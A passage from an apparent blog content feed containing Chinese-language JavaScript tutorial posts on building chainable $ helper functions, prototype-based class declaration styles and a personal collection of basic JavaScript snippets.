class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span></span><br><span class="line">       事件          |   添加和删除事件监听器，对时间对象进行规范内化处理</span><br><span class="line">       DOM          |   类名管理，样式管理</span><br><span class="line">       Ajax         |   多XMLHttpRequest进行规范化处理</span><br><span class="line"> <span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span><span class="symbol">&amp;mdash;</span></span><br><span class="line"></span><br><span class="line">    注：可以对私有的_$构造函数进行扩充</span><br><span class="line">*/</span><br><span class="line">Function.prototype.method = function(name, fn)&#123;</span><br><span class="line">    this.prototype[name] = fn;</span><br><span class="line">    return this;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(function()&#123;</span><br><span class="line"></span><br><span class="line">    function _$(els)&#123;</span><br><span class="line">        this.element = [];</span><br><span class="line">        for(var i = 0, len = els.length; i &lt; len; i++)&#123;</span><br><span class="line">            var element = els[i];</span><br><span class="line">            if(typeof element === &#x27;string&#x27;)&#123;</span><br><span class="line">                element = document.getElementById(element);</span><br><span class="line">            &#125;</span><br><span class="line">            this.element.push(element);</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">        Events</span><br><span class="line">            * addEvent</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    _$.method(&#x27;addEvent&#x27;, function(type, fn)&#123;</span><br><span class="line">            var add = function(el)&#123;</span><br><span class="line">            if(window.addEventListener)&#123;</span><br><span class="line">                el.addEventListener(type, fn, false);</span><br><span class="line">            &#125;else if(window.attachEvent)&#123;</span><br><span class="line">                el.attachEvent(&#x27;on&#x27; + type, fn);</span><br><span class="line">            &#125;</span><br><span class="line">            this.each(function(el)&#123;</span><br><span class="line">                add(el);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;).</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">        otherFun</span><br><span class="line">            * each</span><br><span class="line">            * setStyle</span><br><span class="line">            * show</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">        method(&#x27;otherFun&#x27;, function(fn)&#123;</span><br><span class="line">            for(var i = 0, len = this.element.length; i &lt; len; i++)&#123;</span><br><span class="line">                fn.call(this, this.element[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            return this;</span><br><span class="line">        &#125;).</span><br><span class="line">        method(&#x27;setStyle&#x27;, function(prop, val)&#123;</span><br><span class="line">            this.each(function(el)&#123;</span><br><span class="line">                el.style[prop] = val;</span><br><span class="line">            &#125;);</span><br><span class="line">            return this;</span><br><span class="line">        &#125;).</span><br><span class="line">        method(&#x27;show&#x27;, function()&#123;</span><br><span class="line">            var that = this;</span><br><span class="line">            this.each(function(el)&#123;</span><br><span class="line">                that.setStyle(&#x27;display&#x27;, &#x27;none&#x27;);</span><br><span class="line">            &#125;);</span><br><span class="line">            return this;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    window.installHelper = function(scope, interface)&#123;</span><br><span class="line">        scope[interface] = function()&#123;</span><br><span class="line">            return new _$(arguments);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">    //处理库中$的冲突问题</span><br><span class="line"></span><br><span class="line">    用户可能会这样使用：</span><br><span class="line">    installHelper(window, &quot;$&quot;);</span><br><span class="line"></span><br><span class="line">    $(&#x27;example&#x27;).show();</span><br><span class="line"></span><br><span class="line">    也可以将功能添加到实现定义好的命名空间对象中：</span><br><span class="line">    window.com = window.com || &#123;&#125;;</span><br><span class="line">    com.example = com.example || &#123;&#125;;</span><br><span class="line">    com.example.util = com.example.util || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    installHelper(com.example.util, &#x27;$&#x27;);</span><br><span class="line">    (function()&#123;</span><br><span class="line">        var get = com.example.util.get;</span><br><span class="line">        get(&#x27;example&#x27;).show();</span><br><span class="line">    &#125;)();</span><br><span class="line">*/</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript链式调用的实现方式</title>
      <link href="/blog/2012/09/18/javascript%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/"/>
      <url>/blog/2012/09/18/javascript%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p><strong>本文从ITeye导入</strong>&nbsp;</p><p>在我们所用到的库中，可以看到很多诸如</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="constructor">$(<span class="params">window</span>)</span>.add<span class="constructor">Event(&#x27;<span class="params">load</span>&#x27;, <span class="params">function</span>()</span>&#123;</span><br><span class="line">    <span class="constructor">$(&#x27;<span class="params">test</span>&#x27;)</span>.show<span class="literal">()</span>.set<span class="constructor">Style(&#x27;<span class="params">color</span>&#x27;, &#x27;<span class="params">red</span>&#x27;)</span>.add<span class="constructor">Event(&#x27;<span class="params">click</span>&#x27;, <span class="params">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="constructor">$(<span class="params">this</span>)</span>.set<span class="constructor">Style(&#x27;<span class="params">color</span>&#x27;, &#x27;<span class="params">yellow</span>&#x27;)</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;的链式调用，那么这样的链式结构是怎么实现的呢，下面我们利用代码来探讨一番：</p><p>&nbsp;先分解下，我们队$函数已经很熟悉了，他通常返回一个HTML元素或者HTML元素的集合，如下所示：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> $(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> elements = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = arguments.<span class="built_in">length</span>; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> element = els[i];</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">typeof</span> element === <span class="string">&#x27;string&#x27;</span>)&#123;</span><br><span class="line">            element = document.getElementById(element);</span><br><span class="line">        &#125;</span><br><span class="line">        elements.<span class="built_in">push</span>(element);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> elements;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;但是，如果把这个函数改造为一个构造器，把那些元素作为数组保存在一个实例属性中，并让所有定义在构造器函数的prototype属性所指对象中的方法都返回用以调用放方法的那个实例的引用，那么他就具有了进行链式调用的能力。</p><p>先别说的太远，我们首先需要把这个$函数改为一个工厂函数，他负责创建支持链式调用的对象。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_$</span>(<span class="params">els</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">element</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = els.<span class="property">length</span>; i &lt; len; i++)&#123;</span><br><span class="line">            <span class="keyword">var</span> element = els[i];</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">typeof</span> element === <span class="string">&#x27;string&#x27;</span>)&#123;</span><br><span class="line">                element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(element);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">element</span>.<span class="title function_">push</span>(element);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">$</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">_$</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();       </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于所有对象都会继承其原型对象的属性和方法，所以我们可以让定义原型对象中的那几个方法都返回用以调用方法的实例对象的引用，这样既可以对那些方法进行链式调用，想好这一点，我们现在就动手在_$这个私用构造函数的prototype对象那个中添加方法，以便实现链式调用。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_$</span>(<span class="params">els</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">element</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = els.<span class="property">length</span>; i &lt; len; i++)&#123;</span><br><span class="line">            <span class="keyword">var</span> element = els[i];</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">typeof</span> element === <span class="string">&#x27;string&#x27;</span>)&#123;</span><br><span class="line">                element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(element);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">element</span>.<span class="title function_">push</span>(element);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _$.prototype = &#123;</span><br><span class="line">        <span class="attr">each</span>: <span class="keyword">function</span>(<span class="params">fn</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = <span class="variable language_">this</span>.<span class="property">element</span>.<span class="property">length</span>; i &lt; len; i++)&#123;</span><br><span class="line">                fn.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="variable language_">this</span>.<span class="property">element</span>[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="attr">setStyle</span>: <span class="keyword">function</span>(<span class="params">prop, val</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">el</span>)&#123;</span><br><span class="line">                el.<span class="property">style</span>[prop] = val;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="attr">show</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> that = <span class="variable language_">this</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">el</span>)&#123;</span><br><span class="line">                that.<span class="title function_">setStyle</span>(<span class="string">&#x27;display&#x27;</span>, <span class="string">&#x27;none&#x27;</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="attr">addEvent</span>: <span class="keyword">function</span>(<span class="params">type, fn</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> add = <span class="keyword">function</span>(<span class="params">el</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">addEventListener</span>)&#123;</span><br><span class="line">                    el.<span class="title function_">addEventListener</span>(type, fn, <span class="literal">false</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">attachEvent</span>)&#123;</span><br><span class="line">                    el.<span class="title function_">attachEvent</span>(<span class="string">&#x27;on&#x27;</span> + type, fn);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">el</span>)&#123;</span><br><span class="line">                <span class="title function_">add</span>(el);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">$</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">_$</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;看看该类每个方法的最后一行，你会发现他们都是以"return this;"结束，这样将用以调用方法的对象传给调用链上的下一个方法。</p><p>              </p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript的灵活性</title>
      <link href="/blog/2012/09/17/javascript%E7%9A%84%E7%81%B5%E6%B4%BB%E6%80%A7/"/>
      <url>/blog/2012/09/17/javascript%E7%9A%84%E7%81%B5%E6%B4%BB%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>如果你偏爱过程式编程，你可以这样：</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*Start and stop animations using functions.*/</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">startAnination</span><span class="params">()</span> &#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stopAnination</span><span class="params">()</span>&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种做法很简单，但是你无法创建可以保存状态并且具有一些仅对其内部状态进行操作的方法的动画对象。</p><p>下面的代码定义了一个类，你可以用它创建这种对象：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*Anim class.*/</span></span><br><span class="line"> <span class="keyword">var</span> <span class="title class_">Anim</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ....</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="title class_">Anim</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">start</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ....</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="title class_">Anim</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">stop</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ....</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*Usage.*/</span></span><br><span class="line"> <span class="keyword">var</span> myAnim = <span class="keyword">new</span> <span class="title class_">Anim</span>();</span><br><span class="line"> myAnim.<span class="title function_">start</span>();</span><br><span class="line"> ....</span><br><span class="line"> myAnim.<span class="title function_">stop</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述代码定义了一个名为Anim的类，并把两个方法赋给该类的prototype的属性。</p><p>如果你更喜欢把类的定义封装在一条声明中，则可以改用下面的代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*Anim class, with a slightly different syntax for declaring methods*/</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Anim</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ....</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="title class_">Anim</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    start : <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        ....</span><br><span class="line">    &#125;;</span><br><span class="line">    stop : <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        ....</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这在传统的面向对象程序员看来肯呢过更眼熟一点，他们习惯于看到类的方法声明内嵌在类的</p><p>声明之中。要是你以前用过这样的编程风格，可能想尝试下下面的是里。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*Add method to the Function object that can be used to declare methods*/</span></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">methed</span> = <span class="keyword">function</span>(<span class="params">name, fn</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property"><span class="keyword">prototype</span></span>[name] = fn;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Anim class, with ,methods created using a conbenience ,method.*/</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Anim</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Anim</span>.<span class="title function_">method</span>(<span class="string">&#x27;start&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    .....</span><br><span class="line">&#125;);</span><br><span class="line"><span class="title class_">Anim</span>.<span class="title function_">method</span>(<span class="string">&#x27;stop&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Function.protytype.method用于为类添加新方法。他有两个参数，第一个是字符串，表示新方法</p><p>的名称；第二个是用作新方法的函数。</p><p>你可以进一步修改Function.prototype.method, 使其可被链式调用。这只需要在他返回this</p><p>值即可：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*This version alllows the calls to be chained.*/</span></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">method</span> = <span class="keyword">function</span>(<span class="params">name, fn</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property"><span class="keyword">prototype</span></span>[name] = fn;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Anim class, with methods created using a convenience and chaining.*/</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Anim</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Anim</span>.</span><br><span class="line">    <span class="title function_">method</span>(<span class="string">&#x27;start&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        ....</span><br><span class="line">    &#125;).</span><br><span class="line">    <span class="title function_">method</span>(<span class="string">&#x27;stop&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        ....</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>              </p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>平时积累的一点东西</title>
      <link href="/blog/2012/09/16/%E5%B9%B3%E6%97%B6%E7%A7%AF%E7%B4%AF%E7%9A%84%E4%B8%80%E7%82%B9%E4%B8%9C%E8%A5%BF/"/>
      <url>/blog/2012/09/16/%E5%B9%B3%E6%97%B6%E7%A7%AF%E7%B4%AF%E7%9A%84%E4%B8%80%E7%82%B9%E4%B8%9C%E8%A5%BF/</url>
      
        <content type="html"><![CDATA[<p><strong>本文从ITeye导入</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">*</span><br><span class="line">*                         ☆★☆★☆★☆★☆★☆JavaScript草稿集☆★☆★☆★☆★☆★☆</span><br><span class="line">*</span><br><span class="line">*                                               By Barret Lee</span><br><span class="line"></span><br><span class="line">★JQuery★&lt;!--&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;http:code.jquery.com/jquery-latest.js&quot;</span>&gt;&lt;/script&gt;--&gt;</span><br><span class="line"></span><br><span class="line">★★★★★★★★公共部分★★★★★★★★</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">printf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">        document.write(obj + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> $(<span class="params">obj</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> document.getElementById(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">forEach</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (m in obj) &#123;</span><br><span class="line">            printf(m + <span class="string">&#x27;:&#x27;</span> + obj[m]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">★★★★★★★★注释方式★★★★★★★★★</span><br><span class="line">    *</span><br><span class="line">    *    &lt;!--[CDATA[</span><br><span class="line">    *</span><br><span class="line">    *    ]]--&gt;</span><br><span class="line"></span><br><span class="line">★★★★★★★★alertBox★★★★★★★★</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">alertBox</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> coverLayer = document.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> contentLayer = document.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">        coverLayer.setAttribute(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;coverLayer&quot;</span>);</span><br><span class="line">        contentLayer.setAttribute(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;contentLayer&quot;</span>);</span><br><span class="line">        contentLayer.innerHTML = <span class="string">&quot;&lt;p&gt;Huazhong University Of Science And Technology&lt;/p&gt;&quot;</span>;</span><br><span class="line">        document.body.appendChild(coverLayer);</span><br><span class="line">        document.body.appendChild(contentLayer);</span><br><span class="line">    &#125;</span><br><span class="line">    window.onload = alertBox;</span><br><span class="line"></span><br><span class="line">★★★★★★★★基本数据类型★★★★★★★★</span><br><span class="line">    <span class="keyword">var</span> x = parseFloat(<span class="string">&quot;20.33&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> y = parseInt(<span class="string">&quot;11&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">var</span> z = Math.<span class="built_in">sin</span>(Math.<span class="literal">PI</span> / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">var</span> s = <span class="string">&quot;this is a string.&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>];</span><br><span class="line">    <span class="keyword">var</span> o = &#123;<span class="attr">first</span>: <span class="number">1</span>, <span class="attr">second</span>: <span class="number">2</span>, <span class="attr">third</span>: <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="keyword">var</span> result = o.valueOf();</span><br><span class="line">    printf(result + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    printf(<span class="number">1</span> + <span class="string">&quot;2&quot;</span> + <span class="string">&quot;&lt;br&gt;&quot;</span>); <span class="number">12</span></span><br><span class="line">    printf((a instanceof <span class="built_in">Array</span>) + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    printf((a.constructor) + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    printf(o.hasOwnProperty(<span class="string">&quot;first&quot;</span>) + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">★★★★★★★★arguments数组★★★★★★★★</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">plus</span>(<span class="params">x, y, z</span>) &#123;</span><br><span class="line">        <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (arguments.<span class="built_in">length</span> !== <span class="number">3</span>) &#123;</span><br><span class="line">            throw <span class="keyword">new</span> Error(arguments.callee);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x + y + z;</span><br><span class="line">    &#125;</span><br><span class="line">    plus(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    printf(plus(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>));</span><br><span class="line">    <span class="keyword">var</span> cal = &#123;</span><br><span class="line">        <span class="attr">x</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">y</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">f</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> this.x + this.y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    printf(cal.f() + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">★★★★★★★★函数call和apply★★★★★★★★</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">fCall</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> x + y;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> res = fCall.call(cal, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> res1 = fCall.apply(cal,[<span class="number">6</span>, <span class="number">9</span>]);</span><br><span class="line">        printf(res + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">        printf(res1 + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">★★★★★★★★类和继承★★★★★★★★</span><br><span class="line">    <span class="keyword">function</span> <span class="title 